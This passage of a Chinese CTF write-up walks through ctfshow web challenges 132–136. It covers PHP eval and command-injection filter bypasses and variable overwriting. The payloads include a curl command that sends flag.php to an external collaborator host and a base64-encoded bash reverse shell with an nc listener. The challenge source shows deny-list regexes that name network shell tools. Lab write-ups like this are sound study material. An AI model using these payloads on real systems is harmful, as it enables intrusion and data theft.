逻辑：`if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin")`这里使用的||运算直接username=admin绕过，在给个code=admin就直接拿到flag了

payload:

```
/admin/index.php?code=admin&username=admin&password=666
```

## Web133

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 16:43:44

*/

error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
}
```

参考：

[ctfshow web133和其他命令执行的骚操作-CSDN博客](https://blog.csdn.net/qq_46091464/article/details/109095382)

关键是使用``执行命令

payload：

```
方法一：
?F=`$F`;+curl -F xx=@flag.php  sok4bsu5pputpnmse0ipafcwun0fo7cw.oastify.com
方法二
// 反弹shell,输入攻击机公网IP
┌──(kali㉿kali)-[~]
└─$ echo "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"|base64  
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxCg==

┌──(kali㉿kali)-[~]
└─$ bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxCg==}|{base64,-d}|bash"
payload = `$F;+bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxCg==}|{base64,-d}|bash";`
攻击机建立监听即可:
nc -lvnp 4444
```

## Web134：parse_str()和extract()变量覆盖

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-14 23:01:06

*/

highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
}
```

payload：有点骚不过之前有类似的题目

```
/?_POST[key1]=36d&_POST[key2]=36d
```

## Web135

题目：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-16 18:48:03

*/

error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("师傅们居然破解了前面的，那就来一个加强版吧");
    }
}
```

没有写文件限制

payload:

```bash
F=`$F` ;nl flag.php>1.txt
F=`$F` ;cp flag.php 1.txt
F=`$F` ;mv flag.php 1.txt
```

## Web136

题目：

```php
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?>
```

不能使用>，这题关键是tee命令

payload:

```
c=ls /|tee 1
c=cat /f149_15_h3r3|tee 3
```



